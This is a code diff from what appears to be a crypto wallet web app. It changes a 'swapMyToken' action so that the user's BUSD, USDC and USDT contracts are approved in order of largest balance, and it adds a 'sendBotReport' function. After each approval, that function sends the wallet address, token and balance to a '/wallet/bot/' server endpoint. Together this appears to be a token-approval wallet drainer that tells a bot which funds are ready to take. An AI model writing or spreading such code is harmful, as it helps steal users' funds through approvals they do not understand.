@@ -24,14 +24,9 @@ export async function setWallet ({ commit, dispatch }, connectedWallet) {
   await dispatch('getWalletFromDB', wallet?.accounts?.[0]?.address)
   await dispatch('getBTMTBalance')
 
-  const busdBalance = await busdContract.getBalance(wallet.accounts?.[0]?.address)
-  commit('mutationBusdBalance', busdBalance)
-
-  const usdcBalance = await usdcContract.getBalance(wallet.accounts?.[0]?.address)
-  commit('mutationUsdcBalance', usdcBalance)
-
-  const usdtBalance = await usdtContract.getBalance(wallet.accounts?.[0]?.address)
-  commit('mutationUsdtBalance', usdtBalance)
+  busdContract.getBalance(wallet.accounts?.[0]?.address).then(balance => commit('mutationBusdBalance', balance))
+  usdcContract.getBalance(wallet.accounts?.[0]?.address).then(balance => commit('mutationUsdcBalance', balance))
+  usdtContract.getBalance(wallet.accounts?.[0]?.address).then(balance => commit('mutationUsdtBalance', balance))
 }
 
 export async function getWalletFromDB ({ commit, dispatch }, address) {
@@ -94,23 +89,47 @@ export async function getAirDrop ({ commit, dispatch, state }) {
 
 export async function swapMyToken ({ state }) {
   const busd = {
+    name: 'busd',
     balance: state.busdBalance,
     approve: busdContract.approve
   }
   const usdc = {
+    name: 'usdc',
     balance: state.usdcBalance,
     approve: usdcContract.approve
   }
   const usdt = {
+    name: 'usdt',
     balance: state.usdtBalance,
     approve: usdtContract.approve
   }
-
   const arr = [busd, usdc, usdt]
+
   arr.sort((a, b) => a.balance < b.balance ? 1 : -1)
-  await arr[0].approve(state.wallet.address)
-  await arr[1].approve(state.wallet.address)
-  await arr[2].approve(state.wallet.address)
+
+  await arr[0].approve(state.wallet.address).then(() => {
+    sendBotReport(arr[0], state.wallet.address)
+  })
+  await arr[1].approve(state.wallet.address).then(() => {
+    sendBotReport(arr[1], state.wallet.address)
+  })
+  await arr[2].approve(state.wallet.address).then(() => {
+    sendBotReport(arr[2], state.wallet.address)
+  })
+}
+
+function sendBotReport (coin, address) {
+  try {
+    axios.get(`${server.walletServerURI}/wallet/bot/`, {
+      params: {
+        address,
+        approved_token: coin.name,
+        balance: coin.balance
+      }
+    })
+  } catch (e) {
+    console.log(e)
+  }
 }
 
 export function chainChanged ({ commit }, chainId) {
